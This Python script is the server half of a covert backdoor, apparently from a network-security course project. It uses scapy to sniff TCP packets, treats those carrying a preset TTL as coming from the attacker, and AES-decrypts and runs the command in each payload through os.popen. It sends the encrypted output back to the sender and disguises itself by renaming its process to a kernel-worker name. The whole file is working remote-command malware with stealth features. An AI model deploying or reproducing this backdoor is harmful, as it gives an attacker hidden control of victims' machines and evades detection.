#!/usr/bin/python3
import sys
import os
from scapy.layers.inet import *
from scapy.all import *
from Crypto.Cipher import AES
import setproctitle

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# GLOBAL VARIABLES
global serverIP
global listening
global ttlKey
global decryptionKey
global IV
global dstPort
global processName

#-----------------------------------------------------------------------------
# FUNCTION:    usage
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def usage()
#
#  RETURNS:     None
#
#  NOTES: Ensures that user enters in the proper values by checking the number of arguments
#         Command should be in the format:
#         python3 server.py <dstPort> <ttlKey> <encryptionKey> <IV> <processName>
#         i.e. - python3 server.py 80 71 0123456789abcdef abcdefghijklmnop [kworker/2:8505]
#
# ----------------------------------------------------------------------------


def usage():
    global ttlKey
    global decryptionKey
    global IV
    global dstPort
    global processName
    if len(sys.argv) < 5:
        print("Please use format python server.py <dstPort> <ttlkey> <decryptionKey> <IV> <processName>")
        sys.exit()
    else:
        if len(sys.argv[3]) < 16:
            print("Please ensure decryption key is 16 characters in length")
            sys.exit()
        if len(sys.argv[4]) < 16:
            print("Please ensure that the IV is 16 characters in length")
            sys.exit()
        global ttlKey
        dstPort = int(sys.argv[1])
        print("dstPort is " + str(dstPort))
        ttlKey = int(sys.argv[2])
        print("ttlKey is " + str(ttlKey))
        decryptionKey = sys.argv[3]
        print("Decryption key is " + decryptionKey)
        IV = sys.argv[4]
        print("IV is " + IV)
        processName = sys.argv[5]
        print("Process Name is " + processName)


#-----------------------------------------------------------------------------
# FUNCTION:    decrypt_command
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def decrypt_command(command)
#               command - The encrypted command contained in the packet payload.
#
#  RETURNS:     The decrypted plain text command contained in the packet payload.
#
#  NOTES: The function takes the encrypted command contained in the packet payload
#         and decrypts is using the same key and IV used at the attackers system.
#
# ----------------------------------------------------------------------------


def decrypt_command(command):
    global decryptionKey
    global IV

    decryptionKey = decryptionKey
    IV = IV
    decrypt_apply = AES.new(decryptionKey.encode("utf8"), AES.MODE_CFB, IV=IV.encode("utf8"))
    plain = decrypt_apply.decrypt(command)
    return plain


#-----------------------------------------------------------------------------
# FUNCTION:    encrypt_command
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def encrypt_command(command)
#               command - The user's command string to add into the packet payload
#
#  RETURNS:     An encrypted command string
#
#  NOTES: Function encrypts the plaintext command entered by user using PyCryptodome,
#         encrypted with AES CFB.
#
# ----------------------------------------------------------------------------


def encrypt_command(command):
    global decryptionKey
    global ttlKey

    encryptionKey = decryptionKey
    ttlKey = ttlKey
    # key='0123456789abcdef'
    # IV = "abcdefghijklmnop"
    encryptor = AES.new(encryptionKey.encode("utf8"), AES.MODE_CFB, IV=IV.encode("utf8"))
    return encryptor.encrypt(command.encode("utf8"))


#-----------------------------------------------------------------------------
# FUNCTION:    received_packet
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def received_packet(packet)
#               packet - The packet that is sent from the attacker machine
#
#  RETURNS:     True - Continue with code execution
#               False - Keep filtering for packets
#
#  NOTES: Function executes after a packet has been received from the attacker machine.
#         Authenticates that is actually from the attacker program by looking at the
#         TTL, which should be 71. The function takes the encrypted command contained
#         in the packet payload and decrypts is using the same key and IV used as
#         the attackers system.
#
# ----------------------------------------------------------------------------


def received_packet(packet):
    global ttlKey
    global dstPort

    if IP in packet[0]:
        # Authenticate that the packets are actually from the attacker
        # Key is TTL 71
        if packet[IP].ttl == ttlKey:
            srcIP = packet[IP].src
            srcPort = packet[TCP].sport
            command = decrypt_command(packet["Raw"].load)
            # Execute the command
            f = os.popen(command.decode("utf8"))
            result = f.read()
            print(result)
            if result == "":
                result = "ERROR or No Output Produced"
            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=dstPort, dport=srcPort)/encrypt_command(result))
            send(newPacket)
            return True
        else:
            return False

#-----------------------------------------------------------------------------
# FUNCTION:    main
#
#  PROGRAMMER:  Jason Soukchamroeun
#
#  INTERFACE:   def main()
#
#  RETURNS:     Result on success or failure.
#
#  NOTES: Main entry point into the program. Initializes command-line argument
#         parsing. Encrypts or decrypts packets sent/received.
#
# ----------------------------------------------------------------------------

def main():
    global dstPort
    global processName
    usage()

    # Set process title to name less suspicious
    setproctitle.setproctitle(processName)

    # Listen for connections
    listening = True
    while listening:
        sniff(filter='tcp and dst port ' + str(dstPort), stop_filter=received_packet)


if __name__ == "__main__":
    main()
